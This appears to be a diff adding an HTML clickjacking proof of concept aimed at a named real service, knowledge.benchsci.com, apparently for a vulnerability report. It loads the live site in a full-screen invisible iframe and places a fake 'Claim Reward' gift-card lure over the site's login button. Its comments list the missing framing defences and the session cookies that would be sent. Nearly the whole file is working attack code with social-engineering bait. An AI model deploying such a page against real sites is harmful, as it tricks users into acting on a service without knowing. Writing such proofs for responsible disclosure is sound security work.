@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>BenchSci Clickjacking PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:Arial,sans-serif; background:#1a1a2e; color:#eee; overflow:hidden; }
+
+/* ===== Control Bar ===== */
+.bar {
+  position:fixed; top:0; left:0; right:0; z-index:9999;
+  background:#000; padding:6px 12px;
+  font-size:12px; font-family:monospace;
+  display:flex; gap:8px; align-items:center;
+  border-bottom:1px solid #333;
+}
+.bar button {
+  background:#222; color:#0f0; border:1px solid #555;
+  padding:4px 10px; cursor:pointer; font-family:monospace; font-size:11px;
+  border-radius:3px;
+}
+.bar button:hover { background:#333; }
+.bar .info { color:#888; }
+.bar .ok { color:#0f0; }
+
+/* ===== Transparent Iframe (full screen) ===== */
+.frame {
+  position:fixed; top:0; left:0;
+  width:100%; height:100%;
+  z-index:100;
+  border:none;
+  opacity:0;
+  transition:opacity 0.3s;
+}
+.frame.show50 { opacity:0.5; border:2px solid #e94560; }
+
+/* ===== Decoy Button ===== */
+/* Positioned top-right — overlaps BenchSci's "Log In To See More" button */
+.trap-container {
+  position:fixed; top:10px; right:200px; z-index:1;
+}
+.trap-btn {
+  background:linear-gradient(135deg,#e94560,#f5a623);
+  color:white; border:none;
+  padding:10px 24px; font-size:14px;
+  border-radius:6px; cursor:pointer; font-weight:bold;
+  box-shadow:0 4px 15px rgba(233,69,96,0.4);
+}
+.trap-btn:hover { transform:scale(1.05); }
+
+/* ===== Decoy Page Background ===== */
+.bg {
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  display:flex; align-items:center; justify-content:center;
+  z-index:0;
+}
+.bg-box {
+  background:#16213e; border-radius:12px; padding:40px;
+  text-align:center; max-width:420px;
+  border:1px solid #0f3460;
+}
+.bg-box h1 { color:#e94560; font-size:20px; margin-bottom:10px; }
+.bg-box p  { color:#888; font-size:13px; line-height:1.6; }
+
+/* ===== Result Toast ===== */
+.toast {
+  position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
+  z-index:10000; background:#0f3460; color:#0f0;
+  padding:14px 24px; border-radius:8px;
+  font-family:monospace; font-size:13px; text-align:center;
+  border:1px solid #e94560; display:none; max-width:500px;
+}
+.toast.show { display:block; }
+</style>
+</head>
+<body>
+
+<div class="bar">
+  <span class="info">[Clickjacking PoC] BenchSci Knowledge Center</span>
+  <button onclick="toggle()">Toggle iframe visibility</button>
+  <span class="info" id="status">Click "Toggle" to see iframe overlay</span>
+</div>
+
+<!-- Decoy background -->
+<div class="bg">
+  <div class="bg-box">
+    <h1>🎁 Congratulations! You've been selected!</h1>
+    <p>Click the "Claim Reward" button in the top-right corner to claim your gift card</p>
+  </div>
+</div>
+
+<!-- Decoy button: positioned top-right to overlap BenchSci's "Log In To See More" -->
+<div class="trap-container">
+  <button class="trap-btn" onclick="clicked()">🎁 Claim Reward</button>
+</div>
+
+<!--
+  Transparent iframe — loads BenchSci home page
+  ✓ No X-Frame-Options → can be embedded
+  ✓ No CSP frame-ancestors → can be embedded
+  ✓ SameSite=None cookie → victim's session auto-sent
+  ✓ No frame-busting JS → won't break out of iframe
+
+  iframe covers the full screen, opacity:0 = completely invisible.
+  BenchSci's navbar is at the top,
+  "Log In To See More" button is in the top-right.
+  Our decoy button is also in the top-right.
+
+  Victim clicks "Claim Reward"
+  → actually clicks BenchSci's "Log In To See More"
+  → redirected to SAML login / or triggers login action
+  → this is clickjacking: victim operates BenchSci without knowing
+-->
+<iframe class="frame" id="frame"
+        src="https://knowledge.benchsci.com/home"
+        onload="onLoad()"></iframe>
+
+<div class="toast" id="toast"></div>
+
+<script>
+var frame = document.getElementById('frame');
+var visible = false;
+var loaded = false;
+
+function onLoad() {
+  loaded = true;
+  document.getElementById('status').innerHTML =
+    '<span class="ok">✓ iframe loaded — BenchSci does not prevent framing (no X-Frame-Options)</span>';
+}
+
+function toggle() {
+  visible = !visible;
+  if (visible) {
+    frame.className = 'frame show50';
+    document.getElementById('status').textContent =
+      'iframe semi-visible — note BenchSci\'s "Log In To See More" overlapping the decoy button';
+  } else {
+    frame.className = 'frame';
+    document.getElementById('status').textContent =
+      'iframe is transparent — clicking "Claim Reward" will actually trigger BenchSci\'s button';
+  }
+}
+
+function clicked() {
+  // This function only fires if the decoy button is on top
+  // When iframe is transparent and z-index:100 > trap z-index:1,
+  // the click is received by the iframe, not this function
+  //
+  // If this code runs, the user set iframe to visible (red border warning)
+  showToast('If you see this, the iframe is visible.\n' +
+            'Click "Toggle" to make the iframe transparent, then click "Claim Reward".\n' +
+            'When transparent, your click passes through to BenchSci\'s real button.');
+}
+
+function showToast(msg) {
+  var t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show';
+  setTimeout(function() { t.className = 'toast'; }, 6000);
+}
+
+// Detect if iframe was blocked
+setTimeout(function() {
+  if (!loaded) {
+    document.getElementById('status').innerHTML =
+      '<span style="color:#f00">✗ iframe not loaded — possibly blocked by X-Frame-Options</span>';
+  }
+}, 5000);
+</script>
+</body>
+</html>
